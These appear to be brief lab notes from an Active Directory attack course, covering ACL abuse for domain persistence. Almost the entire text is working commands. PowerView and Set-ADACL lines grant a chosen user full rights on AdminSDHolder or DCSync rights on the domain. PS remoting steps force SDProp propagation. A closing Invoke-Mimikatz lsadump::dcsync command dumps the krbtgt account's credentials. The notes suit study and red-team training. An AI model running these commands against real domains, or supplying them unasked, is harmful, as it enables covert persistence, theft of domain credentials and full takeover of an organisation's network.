Abusing ACLs to get DCSync Access

• Adding ACL on the Domain Admin group
   ◇ PowerView (Run as DA on DC)
      ▪ Add-ObjectACL -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName user_name -Rights All -Verbose
   ◇ Active Directory Module and Set-ADACL (Run as DA on DC)
      ▪ Import AD module and DLL
      ▪ Import Set-ADACL.ps1 
      ▪ Set-ADACL -DistinguishedName 'DC=Domain_Controller_FQDN_Name' -Principal user_name -GUIDRight DCSync -Verbose → This is to provide user with DCSync access to the specified user.

• Steps to run remotely using PS remoting and running SDPropogator PS1 script
   ◇ Run Invoke-SDPropgator.ps1 with DA rights
   ◇ $sess = New-PSSession -ComputerName Domain_Controller_FQDN_Name
   ◇ Invoke-Command -FilePath .\Invoke-SDPropogator.ps1 -Session $sess
   ◇ Enter-PSSession -Session $sess
   ◇ Invoke-SDPropogator -showProgress -timeoutMinutes 1 -Verbose

• Once the above scripts and command has been ran; check for DCSync Permissions:
   ◇ Open a PowerShell window with student access.
   ◇ Import Invoke-Mimikatz.ps1.
   ◇ Run Invoke-Mimikatz -Command ‘"lsadump::dcsync /user:dcorp\krbtgt"’ → This will check if the user has DCsync rights or not. Also, if the user has rights then it will run DCSync attack and dump credentials for the user specified.
   
